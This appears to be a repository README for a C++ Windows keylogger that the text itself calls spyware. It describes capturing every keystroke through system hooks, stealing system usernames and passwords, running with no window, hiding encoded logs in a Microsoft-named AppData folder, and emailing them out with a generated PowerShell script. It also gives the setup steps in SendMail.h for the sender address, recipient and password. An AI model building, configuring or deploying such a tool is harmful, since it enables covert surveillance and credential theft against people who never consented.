# Advanced-Keylogger Using CPP
Keylogger is a Spyware. It's used to spy the keystrokes pressed by user on keyboard, &amp; Also to steal the user-name and password of System, It record that Information into base-64 encrypted text log file and Then It send that file to User's Email. I created this Project with help of C++ and PowerShell Script as Technologies and I used Code:Blocks IDE as Tool.

# Features
1) Lots of comments in each of the source files for the user
2) Low-resource usage/non-intensive process and generates no windows when ran
3) Asynchronous execution of processes
4) Capture all keystrokes using system hooks
5) Automatically log the time and date when a log file is produced
6) Uses Base64 encryption with slight modifications and encodes the log multiple times
7) Generates and invokes a powershell script that can attach the encrypted log and email it
8) Lots of customization options in the source code for user to modify:
9) Name of the process
10) Email to send from and send to
11) Time between each log file generation
12) Format how keys are recorded
13) Keys to exclude from recording

# Important Information
Log files by default are stored in C:\Users($User)\AppData\Roaming\Microsoft\CLR
AppLog files are produced in the location when the keylogger is ran for debugging purposes
Problems may occur if the Keylogger in ran multiple times when one is still running
Default name to look for in the task manager to end the keylogger process is Keylogger.exe
Prerequisites
What things you need to install the software and how to install them

* Visual Studio preferably or any IDE of your choice
* C++11 standards must be enabled and if using GCC compilter, -mwindows flag needs to be checked

# Email
Required if user wants the log to be sent to an email.

Open SendMail.h

located at ..\Cpp-Keylogger\Keylogger\SendMail.h
Edit line 16 for where the log should be sent from (default: gmail only, look at Other Emails section for changing that)

line 16: #define X_EM_TO "our.destination@email.address" // change the string to source email
Edit line 17 for where the log should be sent to (can be same as above or any other email is fine)

line 17: #define X_EM_FROM "Address of sender" // change the string to destination email
Edit line 18 for powershell to login to source email (required for email to be sent)

line 18: X_EM_PASS "password" // change the string to password of source email
